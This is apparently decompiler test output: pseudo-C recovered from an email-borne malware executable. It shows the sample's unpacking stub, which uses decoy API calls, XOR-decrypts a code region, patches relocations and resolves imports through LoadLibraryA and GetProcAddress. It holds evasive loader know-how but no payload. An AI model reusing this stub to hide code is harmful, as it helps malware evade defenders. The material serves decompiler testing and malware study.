// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0101/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 edx, word32 ebx)
{
fn00401000_entry:
l00401000:
	word32 eax_28 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	Eq_16 * esi_15 = null
	Eq_16 * edi_266 = eax_28 + 0x00000015
	branch AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l0040102D
l0040102A:
	edi_266 = eax_28 - 0x0000000D;
l0040102D:
	Eq_30 * ecx_49 = null
l00401032:
	branch esi_15 != edi_266 l00401038
l00401036:
	esi_15 = null;
l00401038:
	byte v15_66 = ecx_49->b401190 ^ esi_15->b404000
	ecx_49->b401190 = v15_66;
	ecx_49 = ecx_49 + 1;
	esi_15 = esi_15 + 1;
	branch ecx_49 <u (Eq_30 *) 0x00001440 l00401032
l00401058:
	up32 ebx_105 = 0x00000000
	Eq_55 * ecx_109 = &globals->t402490
	up32 dwLoc08_107 = 0x00000000
l00401074:
	word32 eax_90 = ecx_109->dw0004
	Eq_76 * edx_238 = &ecx_109->t0008
	branch eax_90 - 0x00000008 >>u 0x00000001 <= 0x00000000 l004010BA
l00401086:
	uint32 esi_237 = eax_90 - 0x00000008 >>u 0x00000001
l00401090:
	word32 eax_240 = (word32) edx_238->w0000
	branch (eax_240 & 0x0000F000) != 0x00003000 l004010AE
l004010A3:
	Eq_158 * eax_256 = (eax_240 & 0x00000FFF) + ecx_109->dw0000
	eax_256->dw400F10 = eax_256->dw400F10 + 0xF0400F10;
l004010AE:
	edx_238 = edx_238 + 1;
	esi_237 = esi_237 - 0x00000001;
	branch esi_237 != 0x00000000 l00401090
l004010B6:
	ebx_105 = dwLoc08_107;
l004010BA:
	ebx_105 = ebx_105 + ecx_109->dw0004;
	dwLoc08_107 = ebx_105;
	ecx_109 = ecx_109 + Mem67[ecx_109 + 0x00000004:word32];
	branch ebx_105 <u 0x000000E4 l00401074
l004010CF:
	Eq_94 * esi_112 = &globals->t401C84
	Eq_94 * dwLoc08_113 = &globals->t401C84
	esi_142 = esi_112;
	branch globals->dw401C94 == 0x00000000 l00401155
l004010E2:
	Eq_94 * esi_142
	Eq_109 eax_148 = LoadLibraryA(esi_142->dw000C + 0x00400F10)
	Eq_109 edx_150 = eax_148
	branch eax_148 == 0x00000000 l00401148
l004010FB:
	word32 ebx_174 = esi_142->dw0000
	branch ebx_174 != 0x00000000 l00401104
l00401101:
	ebx_174 = esi_142->dw0010;
l00401104:
	Eq_135 * ebx_179 = ebx_174 + 0x00400F10
	Eq_138 * esi_182 = esi_142->dw0010 + 0x00400F10
	branch ebx_179->dw0000 == 0x00000000 l00401144
l00401113:
	goto l00401119
l00401115:
	edx_150 = eax_148;
l00401119:
	Eq_172 dwLoc1C_218
	int32 eax_211 = ebx_179->dw0000
	word16 ax_213 = (word16) eax_211
	branch eax_211 >= 0x00000000 l00401128
l00401122:
	dwLoc1C_218 = (word32) ax_213;
	goto l0040112D
l00401128:
	dwLoc1C_218 = eax_211 + 0x00400F12;
l0040112D:
	esi_182->dw0000 = GetProcAddress(edx_150, dwLoc1C_218);
	ebx_179 = ebx_179 + 1;
	esi_182 = esi_182 + 1;
	branch ebx_179->dw0000 != 0x00000000 l00401115
l00401144:
	esi_142 = dwLoc08_113;
l00401148:
	esi_142 = esi_142 + 1;
	dwLoc08_113 = esi_142;
	branch esi_142->dw0010 != 0x00000000 l004010E2
l00401155:
	0x00401960()
	ExitProcess(0x00000000)
fn00401000_exit:
}

